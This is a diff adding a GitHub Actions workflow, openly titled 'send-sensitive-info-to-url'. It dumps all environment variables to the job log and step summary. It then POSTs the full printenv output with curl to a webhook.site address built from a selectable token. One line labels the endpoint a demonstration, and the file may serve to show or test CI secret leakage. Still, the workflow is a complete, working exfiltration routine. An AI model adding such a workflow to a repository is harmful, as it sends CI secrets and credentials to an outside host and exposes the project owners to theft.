@@ -1,0 +1,67 @@
+name: send-sensitive-info-to-url
+
+on:
+  workflow_dispatch:
+    inputs:
+      webhook_token:
+        description: "Select the Webhook Token"
+        type: choice
+        required: true
+        default: "6f5c6d00-df46-4a5a-813b-b72a19383119"
+        options:
+          - "6f5c6d00-df46-4a5a-813b-b72a19383119"
+          - "custom-token-value-1"
+          - "custom-token-value-2"
+
+env:
+  WEBHOOK_URL: "https://webhook.site/${{ github.event.inputs.webhook_token }}"
+
+jobs:
+  send-env:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Show webhook URL
+        run: |
+          echo "⚠️ Demonstration webhook endpoint:"
+          echo "👉 $WEBHOOK_URL"
+
+      - name: Print environment variables
+        run: |
+          echo "=== BEGIN printenv ==="
+          printenv
+          echo "=== END printenv ==="
+
+      - name: Add printenv to GitHub Action Summary
+        run: |
+          {
+            echo "## 🔍 Environment variables captured"
+            echo ""
+            echo '```'
+            printenv
+            echo '```'
+            echo ""
+            echo "### Webhook URL Used"
+            echo "👉 $WEBHOOK_URL"
+          } >> $GITHUB_STEP_SUMMARY
+
+      - name: Send printenv to webhook
+        run: |
+          echo "Sending printenv to webhook..."
+          curl -X POST -s \
+            -d "$(printenv)" \
+            "$WEBHOOK_URL"
+
+      - name: Confirm delivery
+        run: |
+          echo "Printenv posted to:"
+          echo "👉 $WEBHOOK_URL"
+
+      - name: Add final confirmation to summary
+        run: |
+          {
+            echo "## ✅ Delivery Confirmation"
+            echo ""
+            echo "Printenv successfully POSTed to:"
+            echo "👉 $WEBHOOK_URL"
+          } >> $GITHUB_STEP_SUMMARY
